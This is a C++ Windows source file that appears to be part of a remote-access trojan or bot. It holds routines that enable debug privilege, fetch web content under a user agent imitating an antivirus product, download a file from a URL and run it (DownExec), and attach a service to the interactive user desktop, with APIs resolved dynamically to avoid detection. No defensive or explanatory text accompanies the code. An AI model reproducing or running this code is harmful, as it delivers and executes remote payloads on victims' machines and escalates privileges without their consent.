#include "StdAfx.h"
#include "Functions.h"

void EncryptData(unsigned char *szRec, unsigned long nLen, unsigned long key)  
{
	unsigned long i;
	unsigned char p;

	p = (unsigned char ) key % 254 +1;

	for(i = 0; i < nLen; i++) 
	{
		*szRec ^= p;
		*szRec += p;
		szRec+=1;
	}
}    

void DecryptData(unsigned char *szRec, unsigned long nLen, unsigned long key)
{
	unsigned long i;
	unsigned char p;

	p = (unsigned char ) key % 254 +1;

	for(i = 0; i < nLen; i++)
	{
		*szRec -= p;
		*szRec++ ^= p;
	}
}

BOOL WINAPI SetPrivilege(LPCTSTR lpszPrivilege)
{
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES tp;
	
	if(OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken) == 0)
	{
		return FALSE;
	}
	
	LookupPrivilegeValue(NULL,lpszPrivilege,&tp.Privileges[0].Luid);
	
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	
	if ( !AdjustTokenPrivileges(hToken,FALSE,&tp,sizeof(TOKEN_PRIVILEGES),(PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL) )
	{ 
		CloseHandle( hToken );
		return FALSE; 
	} 
	return TRUE;
}

int GrantPrivilege()
{
	return SetPrivilege(SE_DEBUG_NAME);
}

char* GetHttpFile(char Url[])
{
	HMODULE hDll;
	LPVOID hInternet,hUrlHandle; 
	char buf[1000],*retstr=NULL;
	retstr=buf;
	DWORD dwFlags;
	
	hDll = LoadLibraryW(L"wininet.dll");
	if(hDll)
	{
		typedef LPVOID ( WINAPI * pInternetOpen ) (LPCTSTR ,DWORD ,LPCTSTR ,LPCTSTR ,DWORD );
		typedef LPVOID ( WINAPI * pInternetOpenUrl ) ( LPVOID ,LPCTSTR ,LPCTSTR ,DWORD ,DWORD ,DWORD);
		typedef BOOL ( WINAPI * pInternetCloseHandle ) ( LPVOID );
		typedef BOOL ( WINAPI * pInternetReadFile ) (LPVOID ,LPVOID ,DWORD ,LPDWORD) ;
		pInternetOpen InternetOpen=NULL;
		pInternetOpenUrl InternetOpenUrl=NULL;
		pInternetCloseHandle InternetCloseHandle=NULL;
		pInternetReadFile InternetReadFile=NULL;
		InternetOpen = ( pInternetOpen ) GetProcAddress( hDll, "InternetOpenA" );
		InternetOpenUrl = (pInternetOpenUrl ) GetProcAddress ( hDll, "InternetOpenUrlA");
		InternetCloseHandle = (pInternetCloseHandle) GetProcAddress (hDll,"InternetCloseHandle");
		InternetReadFile = (pInternetReadFile) GetProcAddress(hDll,"InternetReadFile");
		
		hInternet = InternetOpen("RiSing",0, NULL, NULL, 0);
		if (hInternet != NULL)
		{
			hUrlHandle = InternetOpenUrl(hInternet, Url, NULL, 0, 0x04000000, 0);
			if (hUrlHandle!= NULL)
			{
				memset(buf,0,1000);
				InternetReadFile(hUrlHandle, buf,999, &dwFlags);
				InternetCloseHandle(hUrlHandle);
				hUrlHandle = NULL;
			}
			InternetCloseHandle(hInternet);
			hInternet = NULL;
		}
		FreeLibrary(hDll);
		return retstr;
	}
	else
		return NULL;
}

void DownExec(char url[])
{
	HMODULE hurlmon,hwininet;

	hurlmon=LoadLibraryW(L"urlmon.dll");
	hwininet=LoadLibraryW(L"wininet.dll");

	void (WINAPI *DOWNFILE)  (void*, LPCSTR, LPCSTR, DWORD, DWORD, void*);
    BOOL (WINAPI * CACHEINFO) (LPCSTR, LPINTERNET_CACHE_ENTRY_INFO, LPDWORD);
	(FARPROC&)DOWNFILE= GetProcAddress(hurlmon,"URLDownloadToCacheFileA");
	(FARPROC&)CACHEINFO= GetProcAddress(hwininet,"GetUrlCacheEntryInfoA");
	
	DOWNFILE(NULL,url,"c:\\1.exe",10,0,NULL);
	
	DWORD dwEntrySize=0; 
	LPINTERNET_CACHE_ENTRY_INFO lpCacheEntry; 	
	char strTemp[255]; 
	if (!CACHEINFO(url,NULL,&dwEntrySize)) 
	{  
		lpCacheEntry = (LPINTERNET_CACHE_ENTRY_INFO)new char[dwEntrySize]; 
		if (CACHEINFO(url,lpCacheEntry,&dwEntrySize)) 
		{ 
			memset(strTemp,0,255);
			lstrcpyn(strTemp,lpCacheEntry->lpszLocalFileName,strlen(lpCacheEntry->lpszLocalFileName));
			
			WinExec(strTemp,SW_SHOW);
		} 
	}
	FreeLibrary(hurlmon);
	FreeLibrary(hwininet);
}

void OpenUrl(char url[])
{
	HMODULE hshell;
	hshell=LoadLibraryW(L"Shell32.dll");
	HINSTANCE (WINAPI *SHELLRUN)(HWND,LPCTSTR, LPCTSTR, LPCTSTR ,LPCTSTR , int );
	//动态加载shell32.dll中的ShellExecuteA函数

	(FARPROC&)SHELLRUN=GetProcAddress(hshell,"ShellExecuteA");

	SHELLRUN(GetDesktopWindow(),"open",url,NULL,NULL,5); 
    FreeLibrary(hshell);
}

BOOL OpenUserDesktop()
{
	HDESK   hdeskCurrent;
	HDESK   hdesk;
	HWINSTA hwinstaCurrent;
	HWINSTA hwinsta;
	
	hwinstaCurrent = GetProcessWindowStation();
    if (hwinstaCurrent == NULL)
		return FALSE;
	
    hdeskCurrent = GetThreadDesktop(GetCurrentThreadId());
	if (hdeskCurrent == NULL)
		return FALSE;
	
    hwinsta = OpenWindowStation(_T("winsta0"), FALSE,
		WINSTA_ACCESSCLIPBOARD   |
		WINSTA_ACCESSGLOBALATOMS |
		WINSTA_CREATEDESKTOP     |
		WINSTA_ENUMDESKTOPS      |
		WINSTA_ENUMERATE         |
		WINSTA_EXITWINDOWS       |
		WINSTA_READATTRIBUTES    |
		WINSTA_READSCREEN        |
		WINSTA_WRITEATTRIBUTES);
    if (hwinsta == NULL)
		return FALSE;
	
    if (!SetProcessWindowStation(hwinsta))
		return FALSE;
	
    hdesk = OpenDesktop(_T("default"), 0, FALSE,
		DESKTOP_CREATEMENU      |
		DESKTOP_CREATEWINDOW    |
		DESKTOP_ENUMERATE       |
		DESKTOP_HOOKCONTROL     |
		DESKTOP_JOURNALPLAYBACK |
		DESKTOP_JOURNALRECORD   |
		DESKTOP_READOBJECTS     |
		DESKTOP_SWITCHDESKTOP   |
		DESKTOP_WRITEOBJECTS);
	if (hdesk == NULL)
		return FALSE;
	
	SetThreadDesktop(hdesk);
	
	return TRUE;
}
